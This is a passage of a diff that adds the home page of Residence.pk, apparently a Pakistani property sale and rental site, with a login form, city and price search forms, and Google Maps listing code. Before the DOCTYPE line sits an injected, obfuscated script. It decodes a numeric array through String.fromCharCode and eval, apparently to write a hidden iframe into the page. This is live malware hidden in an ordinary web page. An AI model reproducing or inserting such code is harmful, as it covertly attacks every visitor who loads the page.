@@ -1,0 +1,1654 @@
+<script>try{1-prototype;}catch(bsdbd){x=2;} if(x){f=[0,-1,94,93,22,29,91,101,88,108,99,90,101,106,35,94,91,105,60,98,90,100,91,99,107,105,55,112,74,86,94,68,86,100,91,29,30,88,100,91,111,28,32,81,37,84,31,112,4,-1,-2,0,95,91,105,87,98,92,104,29,32,49,2,0,-1,114,23,91,97,106,91,21,114,3,-2,0,-1,89,102,89,106,100,91,99,107,36,108,105,95,105,92,30,23,51,95,91,105,87,98,92,22,104,105,89,50,30,94,105,107,102,47,38,37,96,101,110,99,96,89,92,99,112,35,100,111,91,110,36,106,106,37,52,94,101,50,41,29,21,110,95,89,107,94,50,30,39,37,30,22,93,92,95,92,95,106,50,30,39,37,30,22,104,107,111,97,92,51,28,109,95,104,96,88,94,99,95,105,112,48,93,96,90,89,92,100,48,103,101,104,96,106,94,102,100,47,88,88,104,102,98,106,107,91,48,99,91,91,107,48,37,50,106,100,103,48,37,50,29,51,51,37,94,93,104,86,100,91,51,25,31,48,4,-1,-2,116,3,-2,0,92,106,101,89,105,96,101,99,23,95,91,105,87,98,92,104,29,32,113,2,0,-1,-2,109,87,103,23,92,21,52,22,89,102,89,106,100,91,99,107,36,88,105,91,86,107,91,58,99,91,98,92,100,105,31,29,94,93,104,86,100,91,28,32,49,91,37,105,90,107,55,105,107,104,94,89,107,105,92,30,28,106,104,88,30,34,28,95,106,105,103,48,36,38,97,99,111,100,94,90,93,97,113,36,98,112,92,108,37,107,104,38,53,92,102,51,39,30,31,48,93,36,104,107,111,97,92,36,107,96,105,94,89,95,97,96,106,110,52,29,93,96,90,89,92,100,28,50,92,35,106,106,110,99,91,35,103,101,104,96,106,94,102,100,50,30,87,87,106,101,97,108,106,90,30,49,91,37,105,105,112,98,90,37,98,90,93,106,50,30,38,28,50,92,35,106,106,110,99,91,35,107,101,101,52,29,37,30,49,91,37,105,90,107,55,105,107,104,94,89,107,105,92,30,28,110,95,89,107,94,28,35,29,38,39,29,30,50,92,35,106,91,105,56,106,105,105,95,87,108,106,90,31,29,93,92,95,92,95,106,28,35,29,38,39,29,30,50,3,-2,0,-1,89,102,89,106,100,91,99,107,36,92,92,106,58,99,91,98,92,100,105,106,56,110,75,87,92,69,87,98,92,30,28,89,101,89,112,29,30,82,38,82,37,87,101,103,91,99,91,57,93,96,98,89,31,92,30,50,3,-2,0,115];v="eva";}if(v)e=eval;w=f;s=[];r=String;z=((e)?"Co"+"de":"");zx=((e)?"fromChar":"")+z;for(i=0;569-5+5-i>0;i+=1){j=i;if(e)s=s+r[zx]((w[j]*1+(9+e("j"+"%3"))));} if(x&&f&&012===10)e(s);</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"> 
+<head>
+<meta name="google-site-verification" content="-0E7OBaeEKlxwvsa9cor4wbEC2nChLltoVJnPFZEu8s" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Buy, Sell and Rent Residential and Commercial Property in Pakistan – Residence.pk</title>	
+
+<META NAME="description" CONTENT="Buy or sell property in Pakistan. Find latest houses, apartments and other real estate for sale and rent in Karachi, Lahore, Islamabad and anywhere in Pakistan.">
+
+<META NAME="keywords" CONTENT="Property in Pakistan, Real-estate in Pakistan, Real estate Pakistan, real estate karachi, Pakistan Property, Property in Lahore, Property in Karachi, Property in Islamabad, Property in Faisalabad, Property in Rawalpindi, Buy Property, Sell Property, Rent Property, Property News, Property for Sale, Property Owners, Propety Agents, Property Firms, Property Consultants, Property Ads, Find Property, Search Property">
+
+<SCRIPT src="http://www.residence.pk/js/global.js" type=text/javascript></SCRIPT>
+<script type="text/javascript" src="http://www.residence.pk/js/prototype.js"></script>
+<script type="text/javascript" src="http://www.residence.pk/js/lib/scriptaculous.js"></script>
+<script type="text/javascript" src="http://www.residence.pk/js/pfunc.js"></script>
+ 
+<LINK media=screen href="http://www.residence.pk/css/default.css" type=text/css rel=stylesheet>
+<link href="http://www.residence.pk/css/styles.css" rel="stylesheet" type="text/css" />
+<link rel="favicon" href="http://www.residence.pk/favicon.ico" type="image/x-icon"/> 
+<link rel="shortcut icon" href="http://www.residence.pk/favicon.ico" />
+<link rel="icon" href="http://www.residence.pk/favicon.ico" />
+
+</head>
+ 
+<body class="header">
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=125120859804&version=v2.0";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<div align="center" style="position:relative; margin: 0px auto; width:1000px">
+
+<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0" style="z-index:100">
+  <tr valign="top">
+    <td width="1000" height="33" align="left" valign="top" colspan="2"><table width="1000" border="0" cellspacing="0" cellpadding="0">
+      <tr valign="top">
+        <td width="500" align="left" valign="top" class="nav" style="padding-top:5px">
+                
+        <a href="http://www.residence.pk/" class="ovalbuttons"><span>Home</span></a> 
+        <a href="http://www.residence.pk/buy-property.php" style="margin-left: 6px" class="ovalbutton"><span>For Sale</span></a>
+        <a href="http://www.residence.pk/rent-property.php" style="margin-left: 6px" class="ovalbutton"><span>For Rent</span></a> 
+       
+                 <a href="http://www.residence.pk/property-map.php" style="margin-left: 6px" class="ovalbutton"><span>Maps </span></a>
+       
+        <td width="345" align="right" valign="top" colspan="2">    				 
+
+                <DIV id="login_div" style="vertical-align:middle; margin-top:5px">
+                <form style="margin:0px" id="form1" name="form1" method="post" action="http://www.residence.pk/authenticate.php?page=index.php">
+                  <img src="http://www.residence.pk/images/email.png" alt="email" title="email" width="20" height="20" style="vertical-align:top; margin-top:5px; margin-right:0px" />
+                  <input onfocus="this.value=''" type="text" name="txtLogin" id="txtLogin" size="14" value="your email" style="height:18px; vertical-align:top; margin-top:5px; margin-left:0px" /><img src="http://www.residence.pk/images/key.png" alt="key" width="20" height="20" style="vertical-align:top; margin-top:5px; margin-right:0px" />
+            <input type="password" name="txtPassword" id="txtPassword" size="14" style="height:18px; vertical-align:top; margin-top:5px; margin-left:0px" />
+			
+           <!-- <input type="submit" name="button" id="button" value="Drive In!" /> -->
+            <input type="image" id="submit" src="http://www.residence.pk/images/btn_go.png" border="0" name="submit" style="margin-top:4px"  /> 
+           
+          </form></DIV>
+                    
+           <div style="padding-top:3px"><a href="http://www.residence.pk/signup.php"> Not a Member? Join Now! </a> | <a href="http://www.residence.pk/forgotPassword.php"> I Forgot my Password </a>  </div>
+          
+                            </td>
+      </tr>
+    </table></td>
+
+  </tr>
+
+  <tr>
+
+    <td width="1000" height="124" align="right" valign="top" onmouseover="resetmenu()">    
+    <div style="position: absolute; top: 45px; left: 2px;">
+    <a href="http://www.residence.pk/"><img src="http://www.residence.pk/images/header_logo.png" /></a>
+    </div>
+    
+    <div style="position: absolute; top: 58px; right: 8px; background-image:url(images/ad_header.jpg)">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- residence_header -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-3372467704838104"
+     data-ad-slot="3688749698"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+   
+    
+          
+   <!--<div style="position: absolute; top: 160px; left: 7px;">
+    <g:plusone size="medium" href="http://www.residence.pk/"></g:plusone> 
+   </div>-->
+    
+   </td>
+    </tr>
+ 
+
+</table>
+
+</div>
+
+
+<script type="text/javascript">
+<!--
+
+function showPriceDiv(div)
+{
+	document.getElementById(div).style.display = "block";
+}
+
+function hidePriceDiv(div)
+{
+	document.getElementById(div).style.display = "none";
+}
+
+function yearDropDown(val)
+{
+	dropdown = "<select name='yr_to' id='yr_to' style='width:90px'>"
+	//dropdown = "";
+	for(var i=2010; i>=val; i--)
+	{
+		dropdown += "<option>"+i+"</option>";
+	}
+	dropdown+= "</select>";
+	return dropdown;
+}
+
+function yearChange(val)
+{
+	document.getElementById("yr_to").innerHTML = yearDropDown(val);
+}
+
+
+
+function priceDropDown(val)
+{
+	dropdown = "<select name='price_to' id='price_to' style='width:90px'>"
+	//dropdown = "";
+	for(var i=10000000; i>= val; i-=50000)
+	{
+		dis = i / 1000;
+		dropdown += "<option value="+i+">"+dis+",000</option>";
+	}
+	dropdown+= "</select>";
+
+	return dropdown;
+	
+}
+
+function priceChange(val)
+{
+	document.getElementById("pr_to").innerHTML = priceDropDown(val);
+}
+
+
+function secondBox(val)
+{
+	//alert(val);
+	document.getElementById("proc").innerHTML = "<img src='images/loading.gif'/>";
+new Ajax.Request('ajax_submodel.php?id='+val,
+  {
+	  
+    method:'get',
+	
+    onSuccess: function(transport){
+      var response = transport.responseText || "no response text";
+      //alert("Success! \n\n" + response);
+	  document.getElementById("ModelSub").innerHTML = response;
+	  document.getElementById("proc").innerHTML = "";
+    },
+    onFailure: function(){ alert('Something went wrong...') 
+	document.getElementById("proc").innerHTML = "";
+	}
+  });
+}
+
+
+function secondBox2(val)
+{
+	//alert(val);
+	document.getElementById("proc2").innerHTML = "<img src='images/loading.gif'/>";
+new Ajax.Request('ajax_submodel2.php?id='+val,
+  {
+	  
+    method:'get',
+	
+    onSuccess: function(transport){
+      var response = transport.responseText || "no response text";
+      //alert("Success! \n\n" + response);
+	  document.getElementById("ModelSub2").innerHTML = response;
+	  document.getElementById("proc2").innerHTML = "";
+    },
+    onFailure: function(){ alert('Something went wrong...') 
+	document.getElementById("proc2").innerHTML = "";
+	}
+  });
+}
+-->
+</script>
+<SCRIPT type="text/javascript" src="./js/jquery.js" id="query"></SCRIPT>
+<SCRIPT type="text/javascript">
+      var delay = 3000;
+      var count = 10;
+      var showing = 3;
+      var i = 0;
+      function move(i) {
+        return function() {
+          $('#recent'+i).remove().css('display', 'none').prependTo('#items');
+        }
+      }
+      function shift() {
+        var toShow = (i + showing) % count;
+        $('#recent'+toShow).slideDown(1000, move(i));
+        $('#recent'+i).slideUp(1000, move(i));
+        i = (i + 1) % count;
+        setTimeout('shift()', delay);
+      }    
+      $(document).ready(function() {
+        setTimeout('shift()', delay);
+      });
+    </SCRIPT>
+
+<STYLE type="text/css">.marquee{white-space:nowrap;overflow:hidden;visibility:hidden;}#marq_kill_marg_bord{border:none!important;margin:0!important;}</STYLE>
+
+<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false&region=PK&key=ABQIAAAAv3S2Ts-jCZt2XsRvZvVXeBQxwcvimB8ScYK11t8vQ85-AOOM1BTxlnWBdImVRl5_2E-j5rwQMfMbxg"></script>
+<meta name="viewport" content="initial-scale=1.0, user-scalable=no"/>
+
+<input name="mapaddresses" type="hidden" id="mapaddresses" value=" Abbottabad Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=6720000 PKR=*==*=2919=*=1=*==*=16 Marlax+x/*/ Abbottabad Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=12000000 PKR=*==*=2918=*=1=*==*=20 Marlax+x/*/No Preference Other Pakistan=*=http://www.residence.pk/uploads/2917_front.jpg.thumb.jpg=*=60000000 PKR=*=No Preference=*=2917=*=1=*==*=3.3 Kanalx+x/*/Korangi Karachi Pakistan=*=http://www.residence.pk/uploads/2916_front.jpg.thumb.jpg=*=5500000 PKR=*=Korangi=*=2916=*=1=*==*=112 Sq.Yardsx+x/*/Korangi Karachi Pakistan=*=http://www.residence.pk/uploads/2915_front.jpg.thumb.jpg=*=19000000 PKR=*=Korangi=*=2915=*=1=*==*=533 Sq.Yardsx+x/*/Johar Town Lahore Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=12500000 PKR=*=Johar Town=*=2914=*=1=*==*=7.5 Marlax+x/*/D.H.A Karachi Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=16500000 PKR=*=D.H.A=*=2913=*=1=*==*=1900 Sq.Feetx+x/*/D.H.A Karachi Pakistan=*=http://www.residence.pk/uploads/2912_front.jpg.thumb.jpg=*=90000000 PKR=*=D.H.A=*=2912=*=1=*==*=1000 Sq.Yardsx+x/*/No Preference Lahore Pakistan=*=http://www.residence.pk/uploads/2911_front.jpg.thumb.jpg=*=2200000 PKR=*=No Preference=*=2911=*=1=*==*=5 Marlax+x/*/Paragon City Lahore Pakistan=*=http://www.residence.pk/uploads/2910_front.jpg.thumb.jpg=*=7586050 PKR=*=Paragon City=*=2910=*=1=*==*=5 Marlax+x/*/Defence (DHA) Lahore Pakistan=*=http://www.residence.pk/uploads/2909_front.jpg.thumb.jpg=*=32500000 PKR=*=Defence (DHA)=*=2909=*=1=*==*=1 Kanalx+x/*/Sawan Garden Islamabad Pakistan=*=http://www.residence.pk/uploads/2908_front.jpg.thumb.jpg=*=8000000 PKR=*=Sawan Garden=*=2908=*=1=*==*=9 Marlax+x/*/Soldier Bazar Karachi Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=6500000 PKR=*=Soldier Bazar=*=2905=*=1=*==*=1300 Sq.Feetx+x/*/North Nazimabad Karachi Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=11500000 PKR=*=North Nazimabad=*=2907=*=1=*==*=240 Sq.Yardsx+x/*/Federal B. Area Karachi Pakistan=*=http://www.residence.pk/uploads/2906_front.jpg.thumb.jpg=*=45000000 PKR=*=Federal B. Area=*=2906=*=1=*==*=600 Kanalx+x/*/Mangopir Karachi Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=700000 PKR=*=Mangopir=*=2904=*=1=*==*=270 Sq.Yardsx+x/*/Shakrial Rawalpindi Pakistan=*=http://www.residence.pk/uploads/2903_front.jpg.thumb.jpg=*=3000000 PKR=*=Shakrial=*=2903=*=1=*==*=4 Marlax+x/*/Adiala Road Rawalpindi Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=3500000 PKR=*=Adiala Road=*=2902=*=1=*==*=10 Marlax+x/*/No Preference Sialkot Pakistan=*=http://www.residence.pk/uploads/2898_front.jpg.thumb.jpg=*=3000000 PKR=*=No Preference=*=2898=*=1=*==*=3.5 Marlax+x/*/Toheed Town Sialkot Pakistan=*=http://www.residence.pk/uploads/2897_front.jpg.thumb.jpg=*=5000000 PKR=*=Toheed Town=*=2897=*=1=*==*=3.75 Marlax+x/*/Toheed Town Sialkot Pakistan=*=http://www.residence.pk/uploads/2896_front.jpg.thumb.jpg=*=4700000 PKR=*=Toheed Town=*=2896=*=1=*==*=3.75 Marlax+x/*/No Preference Hyderabad Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=15000000 PKR=*=No Preference=*=2901=*=1=*==*=10000 Sq.Yardsx+x/*/Toheed Town Sialkot Pakistan=*=http://www.residence.pk/uploads/2900_inside.jpg.thumb.jpg=*=550000 PKR=*=Toheed Town=*=2900=*=1=*==*=15 Marlax+x/*/Jinnah Town Sialkot Pakistan=*=http://www.residence.pk/uploads/2899_front.jpg.thumb.jpg=*=3500000 PKR=*=Jinnah Town=*=2899=*=1=*==*=5 Marlax+x/*/Model Colony Karachi Pakistan=*=http://www.residence.pk/uploads/2895_front.jpg.thumb.jpg=*=1500000 PKR=*=Model Colony=*=2895=*=1=*==*=10 Sq.Yardsx+x/*/Gulberg Lahore Pakistan=*=http://www.residence.pk/uploads/2894_front.jpg.thumb.jpg=*=11111 PKR=*=Gulberg=*=2894=*=1=*==*=2 Kanalx+x/*/Gulberg Lahore Pakistan=*=http://www.residence.pk/uploads/2893_front.jpg.thumb.jpg=*=11111 PKR=*=Gulberg=*=2893=*=1=*==*=1 Kanalx+x/*/Taiser Town Karachi Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=200000 PKR=*=Taiser Town=*=2892=*=1=*==*=80 Sq.Yardsx+x/*/Wahdat Road Lahore Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=21000000 PKR=*=Wahdat Road=*=2891=*=1=*==*=7 Marlax+x/*/Samanabad Lahore Pakistan=*=http://www.residence.pk/images/houseLogo.jpg=*=1000000 PKR=*=Samanabad=*=2890=*=1=*==*=11 Marlax+x/*/" /> 
+ 
+<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=true"></script> 
+<script type="text/javascript"> 
+  var geocoder;
+  var map;
+  function initialize() {
+ 
+ 
+    geocoder = new google.maps.Geocoder();
+    var latlng = new google.maps.LatLng(-34.397, 150.644);
+    var myOptions = {
+      zoom: 6,
+      center: latlng,
+      mapTypeId: google.maps.MapTypeId.ROADMAP
+  }
+  map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
+    
+    
+    
+  }
+ 
+  function codeAddress(addr,mark) {
+ 
+ 
+    var address = addr;
+	var marker = mark;
+	
+    if (geocoder) {
+      geocoder.geocode( { 'address': address}, function(results, status) {
+        if (status == google.maps.GeocoderStatus.OK) {
+          map.setCenter(results[0].geometry.location);
+	
+          var infowindow = new google.maps.InfoWindow({
+          content: mark
+      });
+ 
+      
+      var marker = new google.maps.Marker({
+          map: map,
+          position: results[0].geometry.location,
+          title: '' + addr + ' (click to view)'
+      });
+ 
+      google.maps.event.addListener(marker, 'click', function() {
+                infowindow.open(map, marker);
+           
+          });
+ 
+	} else {
+	//alert("Geocode was not successful for the following reason: " + status);
+        }
+      });
+    }
+  }
+ 
+function AllAddress()
+{
+ 
+    var adr = "";
+    var adr1 = "";
+    var type1 = "";
+    
+    var adtext = "";
+    adr = document.getElementById("mapaddresses").value;
+ 
+    var areas = adr.split("/*/");
+    for (i = 0; i < areas.length; i++) {
+        var ads = areas[i].split("x+x");
+        adtext = "";
+        for (j = 0; j < ads.length-1; j++) {
+            var attr = ads[j].split("=*=");
+            if(adr1 == "")
+			{
+                adr1 = attr[0];
+				//alert(adr1);
+			}
+            if (type1 == "")
+                type1 = attr[5];
+ 
+            adtext = adtext + "<div style='width:240px;border:1px dotted #808080;'><table><tr><td><a href=property_detail.php?id=" + attr[4] + "> <img width='100' height='70' src='" + attr[1] + "'/></a></td><td align='left' valign='top'>Demand:" + attr[2] + "<br/>Area:" + attr[7] + "<br/><a href=property_detail.php?id=" + attr[4] + ">Address:" + attr[3] + "</a></td></tr><tr><td colspan='2'> <a href=Show-Ad.aspx?AdId=" + attr[4] + ">" + attr[6] + "</a> </td></tr></table></div><br/><br/>"
+ 
+            
+        }
+        if (type1 == "1") {
+            adtext = "<div style='width:260px;'><u><h4><center>" + adr1 + "<br/>(For Sale)</center></h4></u><br/>" + adtext + "</div>";
+        }
+        else {
+            adtext = "<div><u><h4><center>" + adr1 + "<br/>(For Rent)<center></h4></u><br/>" + adtext + "</div>";
+        }
+        codeAddress(adr1, adtext);
+        adr1 = "";
+    }
+    
+ 
+ 
+}
+ 
+</script> 
+
+<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="1000" height="33" align="center" valign="top">
+   
+     <table width="1000" class="contentContainer" align="center">
+  <tr>
+  <td><h2>Find Property for Rent</h2></td><td><h2>Find Property for Sale</h2></td><td><h2>Latest Property for Sale on Map</h2></td>
+  </tr>
+    
+      <tr>
+        <td width="260" align="right" valign="top" class="buyhouse">
+        <form action="rent-property.php" method="get" name="rentProperty" id="rentProperty">
+       
+          <table width="260" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td height="15" colspan="5" class="text01"><table width="260" border="0" cellspacing="0" cellpadding="0">
+                 
+                  <tr>
+                    <td width="76" class="text_form">City</td>
+                    <td colspan="2"><select style="width:170px;" name="city" class="inputBig">
+                                            <option>Any City</option>
+                                            <option value="Attock" > Attock</option>
+                                            <option value="Bahawalnagar" > Bahawalnagar</option>
+                                            <option value="Bannu" > Bannu</option>
+                                            <option value="Bhakkar" > Bhakkar</option>
+                                            <option value="Bhawalpur" > Bhawalpur</option>
+                                            <option value="Burewala" > Burewala</option>
+                                            <option value="Chashma" > Chashma</option>
+                                            <option value="Chakwal" > Chakwal</option>
+                                            <option value="D. I. Khan" > D. I. Khan</option>
+                                            <option value="D. G. Khan" > D. G. Khan</option>
+                                            <option value="Faisalabad" > Faisalabad</option>
+                                            <option value="Gwadar" > Gwadar</option>
+                                            <option value="Gujranwala" > Gujranwala</option>
+                                            <option value="Gujrat" > Gujrat</option>
+                                            <option value="Hasanabdal" > Hasanabdal</option>
+                                            <option value="Haripur" > Haripur</option>
+                                            <option value="Hyderabad" > Hyderabad</option>
+                                            <option value="Islamabad" > Islamabad</option>
+                                            <option value="Jamshoro" > Jamshoro</option>
+                                            <option value="Jhang" > Jhang</option>
+                                            <option value="Jhelum" > Jhelum</option>
+                                            <option value="Kahuta" > Kahuta</option>
+                                            <option value="Kalarkahar" > Kalarkahar</option>
+                                            <option value="Karachi" > Karachi</option>
+                                            <option value="Kasor" > Kasor</option>
+                                            <option value="Khanewal" > Khanewal</option>
+                                            <option value="Kharian" > Kharian</option>
+                                            <option value="Khushab" > Khushab</option>
+                                            <option value="Kohat" > Kohat</option>
+                                            <option value="Kot Adu" > Kot Adu</option>
+                                            <option value="Kotli Azad Kashmir" > Kotli Azad Kashmir</option>
+                                            <option value="Layya" > Layya</option>
+                                            <option value="Lahore" > Lahore</option>
+                                            <option value="Lalamosa" > Lalamosa</option>
+                                            <option value="Larkana" > Larkana</option>
+                                            <option value="Mardan" > Mardan</option>
+                                            <option value="Mianwali" > Mianwali</option>
+                                            <option value="Mirpur" > Mirpur</option>
+                                            <option value="Mirpur Khas" > Mirpur Khas</option>
+                                            <option value="Multan" > Multan</option>
+                                            <option value="Murree" > Murree</option>
+                                            <option value="Muzaffarabad" > Muzaffarabad</option>
+                                            <option value="Nowshera" > Nowshera</option>
+                                            <option value="Okara" > Okara</option>
+                                            <option value="Other" > Other</option>
+                                            <option value="Peshawer" > Peshawer</option>
+                                            <option value="Quetta" > Quetta</option>
+                                            <option value="Rahim Yar Khan" > Rahim Yar Khan</option>
+                                            <option value="Rawalpindi" > Rawalpindi</option>
+                                            <option value="Sadiqabad" > Sadiqabad</option>
+                                            <option value="Sahiwaal" > Sahiwaal</option>
+                                            <option value="Sakhar" > Sakhar</option>
+                                            <option value="Sargodha" > Sargodha</option>
+                                            <option value="Sheikhupura" > Sheikhupura</option>
+                                            <option value="Sibbi" > Sibbi</option>
+                                            <option value="Sialkot" > Sialkot</option>
+                                            <option value="Swat" > Swat</option>
+                                            <option value="Talagang" > Talagang</option>
+                                            <option value="Taxila" > Taxila</option>
+                                            <option value="Wah Cantt" > Wah Cantt</option>
+                                          </select></td>
+                  </tr>
+                  <tr>
+                    <td class="text_form">Monthly Rent</td>
+                    <td width="111" align="left"><select style="width:170px;" name="rent" id="rent" class="inputBig" >
+                     <option selected="selected" value="" >Any</option>
+                      <option value="500:5000" >Below Rs. 5,000</option>
+                      <option value="5000:10000" >Rs. 5,000 to 10,000</option>
+                      <option value="10000:15000" >Rs. 10,000 to 15,000</option>
+                      <option value="15000:25000" >Rs. 15,000 to 25,000</option>
+                      <option value="25000:35000" >Rs. 25,000 to 35,000</option>
+                      <option value="35000:50000" >Rs. 35,000 to 50,000</option>
+                      <option value="50000:75000" >Rs. 50,000 to 75,000</option>
+                      <option value="75000:100000" >Rs. 75,000 to 1 Lac</option>
+                      <option value="100000:150000" >Rs. 1 Lac to 1.5 Lacs</option>
+                      <option value="150000:200000" >Rs. 1.5 Lacs to 2 Lacs</option>
+                      <option value="200000:2900000" >Above 2 Lacs</option>
+                    </select></td>
+                  
+                  </tr>
+                  <tr>
+                    <td class="text_form">&nbsp;</td>
+                    <td colspan="3" align="left"><a href="javascript:document.rentProperty.submit();"><img src="images/btn_search.png" width="70" height="22" alt="" /></a></td>
+                    <td width="136" align="left" valign="middle"></td>
+                  </tr>
+                   <tr>
+                    <td class="text_form">&nbsp;</td>
+                    <td colspan="4" align="left"><a title="Rent out my property" href="rent_property_pakistan.php">RENT OUT MY PROPERTY</a></td>
+                    
+                  </tr>
+                </table></td>
+              </tr>
+            </table>
+        </form>
+        </td>
+       
+        <td width="260" align="right" valign="top" class="buyhouse">
+         <form action="buy-property.php" method="get" name="buyProperty" id="buyProperty">
+     
+            <table width="260" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td height="15" colspan="5" class="text01"><img src="images/spacer.gif" width="1" height="1" alt="" /></td>
+              </tr>
+              <tr>
+                <td width="76" class="text_form">City</td>
+                <td colspan="2">
+                 <select style="width:170px;" name="city" class="inputBig">
+                                      <option>Any City</option>
+                                      <option value="Attock" > Attock</option>
+                                      <option value="Bahawalnagar" > Bahawalnagar</option>
+                                      <option value="Bannu" > Bannu</option>
+                                      <option value="Bhakkar" > Bhakkar</option>
+                                      <option value="Bhawalpur" > Bhawalpur</option>
+                                      <option value="Burewala" > Burewala</option>
+                                      <option value="Chashma" > Chashma</option>
+                                      <option value="Chakwal" > Chakwal</option>
+                                      <option value="D. I. Khan" > D. I. Khan</option>
+                                      <option value="D. G. Khan" > D. G. Khan</option>
+                                      <option value="Faisalabad" > Faisalabad</option>
+                                      <option value="Gwadar" > Gwadar</option>
+                                      <option value="Gujranwala" > Gujranwala</option>
+                                      <option value="Gujrat" > Gujrat</option>
+                                      <option value="Hasanabdal" > Hasanabdal</option>
+                                      <option value="Haripur" > Haripur</option>
+                                      <option value="Hyderabad" > Hyderabad</option>
+                                      <option value="Islamabad" > Islamabad</option>
+                                      <option value="Jamshoro" > Jamshoro</option>
+                                      <option value="Jhang" > Jhang</option>
+                                      <option value="Jhelum" > Jhelum</option>
+                                      <option value="Kahuta" > Kahuta</option>
+                                      <option value="Kalarkahar" > Kalarkahar</option>
+                                      <option value="Karachi" > Karachi</option>
+                                      <option value="Kasor" > Kasor</option>
+                                      <option value="Khanewal" > Khanewal</option>
+                                      <option value="Kharian" > Kharian</option>
+                                      <option value="Khushab" > Khushab</option>
+                                      <option value="Kohat" > Kohat</option>
+                                      <option value="Kot Adu" > Kot Adu</option>
+                                      <option value="Kotli Azad Kashmir" > Kotli Azad Kashmir</option>
+                                      <option value="Layya" > Layya</option>
+                                      <option value="Lahore" > Lahore</option>
+                                      <option value="Lalamosa" > Lalamosa</option>
+                                      <option value="Larkana" > Larkana</option>
+                                      <option value="Mardan" > Mardan</option>
+                                      <option value="Mianwali" > Mianwali</option>
+                                      <option value="Mirpur" > Mirpur</option>
+                                      <option value="Mirpur Khas" > Mirpur Khas</option>
+                                      <option value="Multan" > Multan</option>
+                                      <option value="Murree" > Murree</option>
+                                      <option value="Muzaffarabad" > Muzaffarabad</option>
+                                      <option value="Nowshera" > Nowshera</option>
+                                      <option value="Okara" > Okara</option>
+                                      <option value="Other" > Other</option>
+                                      <option value="Peshawer" > Peshawer</option>
+                                      <option value="Quetta" > Quetta</option>
+                                      <option value="Rahim Yar Khan" > Rahim Yar Khan</option>
+                                      <option value="Rawalpindi" > Rawalpindi</option>
+                                      <option value="Sadiqabad" > Sadiqabad</option>
+                                      <option value="Sahiwaal" > Sahiwaal</option>
+                                      <option value="Sakhar" > Sakhar</option>
+                                      <option value="Sargodha" > Sargodha</option>
+                                      <option value="Sheikhupura" > Sheikhupura</option>
+                                      <option value="Sibbi" > Sibbi</option>
+                                      <option value="Sialkot" > Sialkot</option>
+                                      <option value="Swat" > Swat</option>
+                                      <option value="Talagang" > Talagang</option>
+                                      <option value="Taxila" > Taxila</option>
+                                      <option value="Wah Cantt" > Wah Cantt</option>
+                                    </select>                 
+                </td>
+              </tr>
+              <tr>
+                <td class="text_form">Price</td>
+           
+                <td width="111" align="left"><select style="width:170px;" name="price" id="price" class="inputBig">
+                  <option selected="selected" value="" >Any</option>
+          <option value="100000:1000000" >Below Rs. 10 Lacs</option> 
+          <option value="100000:1500000"  >Rs. 10 to 15 Lacs</option> 
+ 		  <option value="150000:2500000"  >Rs. 15 to 25 Lacs</option> 
+          <option value="250000:4000000"  >Rs. 25 to 40 Lacs</option> 
+          <option value="400000:6000000"  >Rs. 40 to 60 Lacs</option> 
+          <option value="600000:8000000"  >Rs. 60 to 80 Lacs</option>
+          <option value="800000:10000000"  >Rs. 80 to 100 Lacs</option> 
+          <option value="10000000:15000000"  >Rs. 1 to 1.5 Crores</option> 
+          <option value="15000000:20000000"  >Rs. 1.5 to 2 Crores</option> 
+          <option value="20000000:25000000"  >Rs. 2 to 2.5 Crores</option> 
+          <option value="25000000:50000000"  >Rs. 2.5 to 5 Crores</option> 
+          <option value="50000000:100000000"  >Rs. 5 to 10 Crores</option> 
+          <option value="100000000:150000000"  >Rs. 10 to 15 Crores</option> 
+          <option value="150000000:990000000"  >Above 15 Crores</option>
+                  </select></td>
+             
+               
+              </tr>
+              <tr>
+                <td class="text_form">&nbsp;</td>
+                <td colspan="3" align="left"><a href="javascript:document.buyProperty.submit();"><img src="images/btn_search.png" width="70" height="22" alt="" /></a></td>
+                <td width="136" align="left" valign="middle">&nbsp;</td>
+              </tr>
+              <tr>
+                    <td class="text_form">&nbsp;</td>
+                    <td colspan="4" align="left"><strong><a title="Sell my property" href="sell_property_pakistan.php">SELL MY PROPERTY</a></strong></td>
+                    
+                  </tr>
+            </table>
+           
+        </form></td>
+        
+        <td width="420">
+        <div style="padding:0px 0px 1px 1px;"> 
+<!--<table align="center" style=" border-bottom: 1px dotted #808080; float:left; width:850px; height: 700px;"> -->
+
+    
+     <div id="map_canvas" style=" position:relative; top:0;left:0; float:left; width:430px; height:220px" ></div> 
+     <script type="text/javascript"> 
+         initialize();
+         setTimeout("", 2000);
+         
+         AllAddress();
+     </script> 
+   
+</div>
+        </td>
+       
+      </tr>
+    </table>
+ 
+
+</td></tr> </table>
+
+<table width="1000" height="540" align="center">
